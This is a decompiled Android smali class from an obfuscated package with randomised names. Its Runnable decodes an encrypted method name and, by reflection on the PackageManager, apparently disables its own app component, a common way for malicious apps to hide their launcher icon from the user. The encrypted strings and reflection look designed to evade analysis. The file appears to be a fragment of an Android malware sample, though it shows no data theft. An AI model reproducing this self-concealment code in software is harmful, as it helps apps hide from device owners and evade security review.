.class Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS$a;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "a"
.end annotation


# instance fields
.field final a:Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS;

.field final synthetic b:Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS;


# direct methods
.method constructor <init>(Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS;Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS;)V
    .locals 0

    iput-object p1, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS$a;->b:Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p2, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS$a;->a:Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    :try_start_0
    new-instance v0, Landroid/content/ComponentName;

    iget-object v1, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS$a;->b:Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS;

    const-class v2, Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS;

    invoke-direct {v0, v1, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v1, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS$a;->a:Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS;

    invoke-virtual {v1}, Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    const-string v2, "UdizlZvEGuYUAy"

    invoke-static {v2}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x3

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v4, 0x0

    const-class v5, Landroid/content/ComponentName;

    aput-object v5, v3, v4

    const/4 v4, 0x1

    sget-object v5, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v5, v3, v4

    const/4 v4, 0x2

    sget-object v5, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v5, v3, v4

    invoke-virtual {v1, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    iget-object v2, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS$a;->a:Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS;

    invoke-virtual {v2}, Lru/jdhndtpk/iypwqbmltdwdk/jag/kpPFzOQS;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const/4 v3, 0x3

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v0, v3, v4

    const/4 v0, 0x1

    const/4 v4, 0x2

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v3, v0

    const/4 v0, 0x2

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v3, v0

    invoke-virtual {v1, v2, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_0
.end method
